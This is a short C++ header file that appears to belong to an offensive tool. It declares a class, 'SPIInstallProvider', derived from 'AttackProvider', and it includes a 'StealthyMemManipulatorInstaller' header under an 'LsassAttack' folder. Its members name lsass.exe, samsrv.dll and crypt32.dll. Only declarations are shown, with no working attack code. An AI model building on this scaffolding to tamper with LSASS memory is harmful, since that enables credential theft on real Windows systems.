#include "../../../AttackServices/LsassAttack/StealthyMemManipulatorInstaller.h"
#include "../../AttackProvider/AttackProvider.h"
#include <string>

using namespace std;

class SPIInstallProvider : public AttackProvider {
public:
    bool Install();
protected:
    void Init();
    wstring samsrvDll;
    wstring msvcrtDll;
    wstring crypt32Dll;
    wstring lsassExe;
};